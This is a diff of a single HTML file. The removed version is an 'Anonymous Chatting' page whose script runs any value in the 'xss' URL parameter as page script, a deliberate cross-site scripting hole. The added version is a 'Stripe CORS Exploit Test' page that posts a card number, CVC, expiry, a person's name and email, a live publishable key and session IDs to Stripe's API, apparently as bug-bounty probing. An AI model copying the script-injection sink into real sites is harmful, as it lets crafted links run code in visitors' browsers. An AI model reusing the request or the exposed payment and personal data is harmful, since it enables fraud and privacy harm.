@@ -1,40 +1,22 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="description" content="Anonymous chatting application for secure communication" />
-    <meta name="keywords" content="anonymous chat, secure messaging, privacy" />
-    <meta name="author" content="Anonymous" />
-    <meta name="robots" content="noindex, nofollow" />
-    <title>Anonymous Chatting</title>
-  </head>
-  <body>
-    <div id="root"></div>
-    <!-- XSS testing code for controlled environment -->
-    <script>
-      // Extract query parameter from URL
-      const urlParams = new URLSearchParams(window.location.search);
-      const payload = urlParams.get('xss');
-
-      // If a payload exists, execute it (for testing purposes only)
-      if (payload) {
-        try {
-          // Create a script element dynamically to execute the payload
-          const script = document.createElement('script');
-          script.text = payload;
-          document.body.appendChild(script);
-          // Example: URL with ?xss=alert('XSS from shared link!')
-          // Alternative: Display payload in DOM for visibility
-          document.getElementById("root").innerHTML = '<h1>XSS Payload Executed</h1>';
-        } catch (e) {
-          console.error("Error executing payload:", e);
-          document.getElementById("root").innerHTML = '<h1>Error: Invalid XSS Payload</h1>';
-        }
-      } else {
-        // Default content if no payload is provided
-        document.getElementById("root").innerHTML = "<h1>Welcome to Anonymous Chatting</h1>";
-      }
-    </script>
-  </body>
+<head>
+  <meta charset="UTF-8">
+  <title>Stripe CORS Test</title>
+</head>
+<body>
+  <h1>Stripe CORS Exploit Test</h1>
+  <script>
+    fetch("https://api.stripe.com/v1/payment_methods", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: "type=card&card[number]=4566554425565227&card[cvc]=150&card[exp_month]=02&card[exp_year]=28&billing_details[name]=Nikesh+Tajpuriya&billing_details[email]=silentnull%40bugcrowdninja.com&billing_details[address][country]=NP&guid=1d5fb495-b883-4cf8-aefb-b87ee4c12a0ca22a9c&muid=ca3950d8-66a4-4bba-865e-4da9fc543547e5e17c&sid=10f4e67d-d8ec-47de-99fa-7888082803d5baefe6&key=pk_live_9ESa8QRql3Jv9oKRVFLxpWvI&payment_user_agent=stripe.js%2F54a85a778c%3B+stripe-js-v3%2F54a85a778c%3B+checkout&client_attribution_metadata[client_session_id]=cs_live_b1Yo274O2qBjf0TfX5VCqAqH9r45J9Puaymte5RdNXVv4qfj8GvSrjL83K&client_attribution_metadata[merchant_integration_source]=checkout&client_attribution_metadata[merchant_integration_version]=hosted_checkout&client_attribution_metadata[payment_method_selection_flow]=automatic"
+    })
+    .then(response => response.text())
+    .then(data => console.log("✅ Response received:", data))
+    .catch(error => console.error("❌ Request failed:", error));
+  </script>
+</body>
 </html>
